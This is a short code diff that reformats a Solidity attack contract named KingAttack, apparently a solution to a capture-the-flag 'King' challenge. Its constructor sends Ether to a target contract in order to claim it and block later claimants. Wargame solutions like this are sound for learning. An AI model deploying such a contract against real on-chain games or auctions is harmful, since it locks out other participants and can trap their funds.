@@ -20,6 +20,6 @@ pragma solidity ^0.8.0;
 
 contract KingAttack {
 	constructor(address _king) payable {
-		(_king).call{value: msg.value}('');
+		(_king).call{ value: msg.value }("");
 	}
 }
